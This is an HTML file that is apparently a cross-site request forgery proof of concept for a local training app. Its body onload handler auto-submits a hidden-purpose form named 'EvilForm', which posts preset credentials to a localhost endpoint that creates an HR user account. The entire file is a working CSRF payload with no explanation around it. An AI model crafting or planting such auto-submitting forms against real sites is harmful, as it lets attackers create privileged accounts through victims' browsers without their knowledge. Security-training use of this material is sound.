<html>
	<body onload='document.EvilForm.submit()'>

    <form action="http://127.0.0.1:8000/create_hr_user_csrf/" method="post" name='EvilForm'>
        <h2>Create a new HR account </h2>

      <table>
        <tr><th><label for="id_first_name">First name:</label></th><td><input id="id_first_name" maxlength="100" name="username" type="text" value="lily_hr_csrf" required /></td></tr>
        <tr><th><label for="id_password">Last name:</label></th><td><input id="id_password" maxlength="100" name="password" type="password" value="lily_hr_pass" required /></td></tr>
        <tr><th><label for="id_password_retype">Last name:</label></th><td><input id="id_password_retype" maxlength="100" name="password_retype" type="password" value="lily_hr_pass" required /></td></tr>

      </table>
      <input type="submit" value="Submit" />
    </form>

</body>
</html>
